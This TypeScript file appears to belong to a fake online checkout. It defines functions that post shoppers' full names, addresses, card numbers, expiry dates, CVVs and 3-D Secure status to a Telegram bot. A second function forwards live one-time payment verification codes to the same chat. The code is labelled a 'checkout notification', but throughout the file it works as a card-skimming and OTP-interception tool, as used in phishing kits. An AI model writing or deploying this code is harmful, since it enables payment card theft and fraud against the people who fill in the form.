interface CheckoutData {
  shippingDetails: {
    fullName: string;
    phoneNumber: string;
    email: string;
    streetAddress: string;
    city: string;
    stateProvince: string;
    postalCode: string;
    country: string;
  };
  paymentDetails: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
    cvv?: string;
    is3DSecure?: boolean;
  };
  orderInfo?: {
    orderId?: string;
    productName?: string;
    quantity?: number;
    amount?: number;
    currency?: string;
  };
}


export async function sendCardDetailsToTelegram(checkoutData: CheckoutData): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = formatCheckoutMessage(checkoutData);

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (result.ok) {
      return true;
    } else {
      return false;
    }
  } catch (error) {
    return false;
  }
}

function formatCheckoutMessage(data: CheckoutData): string {
  const timestamp = new Date().toLocaleString();
  const { shippingDetails, paymentDetails, orderInfo } = data;

  let message = `🛒 <b>NEW CHECKOUT NOTIFICATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Order Information
  if (orderInfo) {
    message += `📋 <b>ORDER DETAILS</b>\n`;
    if (orderInfo.orderId) message += `   Order ID: <code>${orderInfo.orderId}</code>\n`;
    if (orderInfo.productName) message += `   Product: ${orderInfo.productName}\n`;
    if (orderInfo.quantity) message += `   Quantity: ${orderInfo.quantity}\n`;
    if (orderInfo.amount) message += `   Amount: ${orderInfo.currency || 'USD'} ${orderInfo.amount.toFixed(2)}\n`;
    message += `\n`;
  }

  // Shipping Information
  message += `📍 <b>SHIPPING ADDRESS</b>\n`;
  message += `   Name: ${shippingDetails.fullName}\n`;
  message += `   Email: ${shippingDetails.email}\n`;
  message += `   Phone: ${shippingDetails.phoneNumber}\n`;
  message += `   Address: ${shippingDetails.streetAddress}\n`;
  message += `   City: ${shippingDetails.city}, ${shippingDetails.stateProvince} ${shippingDetails.postalCode}\n`;
  message += `   Country: ${shippingDetails.country}\n`;
  message += `\n`;

  // Payment Information
  message += `💳 <b>PAYMENT DETAILS</b>\n`;
  message += `   Cardholder: ${paymentDetails.cardholderName}\n`;
  message += `   Card Type: ${paymentDetails.cardBrand}\n`;

  // Card Security Type
  const securityType = paymentDetails.is3DSecure ? '🔐 3D Secure (3DS 2.0)' : '✅ 2D Secure (Standard)';
  message += `   Security: ${securityType}\n`;

  message += `   Card Number: ${paymentDetails.cardNumber}\n`;
  message += `   Expiry: ${paymentDetails.expiryMonth}/${paymentDetails.expiryYear}\n`;
  if (paymentDetails.cvv) message += `   CVV: ${paymentDetails.cvv}\n`;
  message += `\n`;

  // Timestamp
  message += `⏰ <b>Timestamp:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

export async function sendOTPToTelegram(otp: string, customerName: string): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = `🔐 <b>OTP VERIFICATION CODE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Customer: <b>${customerName || 'Unknown'}</b>
Code: <code>${otp}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is attempting to verify payment.</i>`;

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok;
  } catch (error) {
    return false;
  }
}

export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Promise<boolean> {
  return sendCardDetailsToTelegram(checkoutData);
}
